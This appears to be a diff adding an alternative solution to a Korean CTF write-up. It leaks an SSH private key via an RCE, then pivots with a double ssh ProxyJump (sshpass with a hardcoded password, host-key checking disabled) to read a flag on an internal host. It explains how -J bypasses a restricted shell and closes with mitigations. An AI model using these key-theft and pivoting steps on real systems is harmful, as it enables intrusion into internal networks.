@@ -333,6 +333,18 @@ chain=("printf '#!/bin/sh\\necho secretpassword1!\\n'>/tmp/ap; chmod +x /tmp/ap;
 print(rce(chain))      # → flag{...}
 ```
 > 사람이 직접 풀 땐: RCE 로 `id_rsa` 를 빼낸 뒤 `ssh -i id_rsa -p2222 appuser@<host>` 로 extserver 접속 → 위와 동일하게 `-J ctfuser@intserver flaguser@flagserver` 점프(터널)로 내부 flagserver 접근.
+- **또 다른 풀이(클라이언트에서 이중 ProxyJump)** — 위 RCE-side 터널 대신, RCE 는 `id_rsa` 유출에만 쓰고 나머지는 **내 PC 의 `ssh` 로 두 번 점프**한다. (스크립트: `solution/secret_tunnel_jump.py`)
+  - extserver 의 `2222`(ssh)가 호스트로 publish → `id_rsa` 만 빼내면 `appuser@extserver` 직접 접속. **같은 키로 `ctfuser@intserver` 도 인증**(동일 공개키 신뢰)이라 키 하나로 1·2 홉 모두 통과.
+  - `ssh -J` 는 내부적으로 `-W`(stdio 포워딩)라 **ctfuser 제약셸을 안 탄다**(원본 `-W` 와 같은 우회). `intserver`·`flagserver` 이름은 **각 직전 홉에서 resolve** 되므로 내 PC 가 내부망 이름을 몰라도 됨.
+  - 1·2 홉=키인증, 3 홉(`flaguser@flagserver`)만 비번. **내 터미널엔 tty 가 있어 비번은 그냥 입력**(서버측 askpass 묘기 불필요, `sshpass` 는 선택).
+```bash
+# ① id_rsa 유출(RCE) → ./id_rsa 저장   ② 내 PC 에서 이중 점프로 flag (3홉만 비번)
+sshpass -p 'secretpassword1!' \
+ssh -i id_rsa -o IdentitiesOnly=yes \
+    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
+    -J appuser@127.0.0.1:2222,ctfuser@intserver \
+    flaguser@flagserver 'cat /home/flaguser/flag.txt'      # → flag{...}
+```
 - **대응**: 신뢰경계 입력에 `pickle` 금지(JSON 등 안전 포맷) · 서명키/자격증명 비공개·분리 · 내부망 접근통제·점프호스트 최소권한(restricted shell 만으론 터널 못 막음 → `AllowTcpForwarding no`).
 
 ### fsi-chat-sqli (:9090) — FSI 채팅 SQLi 파일유출 (error-based blind)  ✓ 실익스플로잇 검증됨
